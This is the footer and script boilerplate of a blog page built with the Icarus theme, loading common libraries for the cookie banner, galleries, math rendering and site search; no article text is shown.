rel="noopener">Icarus</a><br><span id="busuanzi_container_site_uv">Visited by <span id="busuanzi_value_site_uv">0</span> users</span></p></div><div class="level-end"><div class="field has-addons"><p class="control"><a class="button is-transparent is-large" target="_blank" rel="noopener" title="Creative Commons" href="https://creativecommons.org/"><i class="fab fa-creative-commons"></i></a></p><p class="control"><a class="button is-transparent is-large" target="_blank" rel="noopener" title="Attribution 4.0 International" href="https://creativecommons.org/licenses/by/4.0/"><i class="fab fa-creative-commons-by"></i></a></p><p class="control"><a class="button is-transparent is-large" target="_blank" rel="noopener" title="Download on GitHub" href="https://github.com/oalieno"><i class="fab fa-github"></i></a></p></div></div></div></div></footer><script src="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/moment@2.22.2/min/moment-with-locales.min.js"></script><script src="https://cdn.jsdelivr.net/npm/clipboard@2.0.4/dist/clipboard.min.js" defer></script><script>moment.locale("en");</script><script>var IcarusThemeSettings = {
            article: {
                highlight: {
                    clipboard: true,
                    fold: 'unfolded'
                }
            }
        };</script><script src="/js/column.js"></script><script src="/js/animation.js"></script><a id="back-to-top" title="Back to top" href="javascript:;"><i class="fas fa-chevron-up"></i></a><script src="/js/back_to_top.js" defer></script><!--!--><!--!--><script src="https://cdn.jsdelivr.net/npm/cookieconsent@3.1.1/build/cookieconsent.min.js" defer></script><script>window.addEventListener("load", () => {
      window.cookieconsent.initialise({
        type: "info",
        theme: "edgeless",
        static: false,
        position: "bottom-left",
        content: {
          message: "This website uses cookies to improve your experience.",
          dismiss: "Got it!",
          allow: "Allow cookies",
          deny: "Decline",
          link: "Learn more",
          policy: "Cookie Policy",
          href: "https://www.cookiesandyou.com/",
        },
        palette: {
          popup: {
            background: "#edeff5",
            text: "#838391"
          },
          button: {
            background: "#4b81e8"
          },
        },
      });
    });</script><script src="https://cdn.jsdelivr.net/npm/lightgallery@1.10.0/dist/js/lightgallery.min.js" defer></script><script src="https://cdn.jsdelivr.net/npm/justifiedGallery@3.8.1/dist/js/jquery.justifiedGallery.min.js" defer></script><script>window.addEventListener("load", () => {
            if (typeof $.fn.lightGallery === 'function') {
                $('.article').lightGallery({ selector: '.gallery-item' });
            }
            if (typeof $.fn.justifiedGallery === 'function') {
                if ($('.justified-gallery > p > .gallery-item').length) {
                    $('.justified-gallery > p > .gallery-item').unwrap();
                }
                $('.justified-gallery').justifiedGallery();
            }
        });</script><!--!--><!--!--><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.15.1/dist/katex.min.css"><script src="https://cdn.jsdelivr.net/npm/katex@0.15.1/dist/katex.min.js" defer></script><script src="https://cdn.jsdelivr.net/npm/katex@0.15.1/dist/contrib/auto-render.min.js" defer></script><script src="https://cdn.jsdelivr.net/npm/katex@0.15.1/dist/contrib/mhchem.min.js" defer></script><script>window.addEventListener("load", function() {
            document.querySelectorAll('[role="article"] > .content').forEach(function(element) {
                renderMathInElement(element);
            });
        });</script><script type="text/x-mathjax-config">MathJax.Hub.Config({
            'HTML-CSS': {
                matchFontHeight: false
            },
            SVG: {
                matchFontHeight: false
            },
            CommonHTML: {
                matchFontHeight: false
            },
            tex2jax: {
                inlineMath: [
                    ['$','$'],
                    ['\\(','\\)']
                ]
            }
        });</script><script src="https://cdn.jsdelivr.net/npm/mathjax@2.7.9/unpacked/MathJax.js?config=TeX-MML-AM_CHTML" defer></script><!--!--><!--!--><!--!--><script src="/js/main.js" defer></script><script src="https://cdnjs.cloudflare.com/ajax/libs/lazysizes/5.3.2/lazysizes.min.js" integrity="sha512-q583ppKrCRc7N5O0n2nzUiJ+suUv7Et1JGels4bXOaMFQcamPk9HjdUknZuuFjBNs7tsMuadge5k9RzdmO+1GQ==" crossorigin="anonymous" referrerpolicy="no-referrer"></script><div class="searchbox"><div class="searchbox-container"><div class="searchbox-header"><div class="searchbox-input-container"><input class="searchbox-input" type="text" placeholder="Type something..."></div><a class="searchbox-close" href="javascript:;">Ã—</a></div><div class="searchbox-body"></div></div></div><script src="/js/insight.js" defer></script><script>document.addEventListener('DOMContentLoaded', function () {
            loadInsight({"contentUrl":"/content.json"}, {"hint":"Type something...","untitled":"(Untitled)","posts":"Posts","pages":"Pages","categories":"Categories","tags":"Tags"});
        });</script></body></html>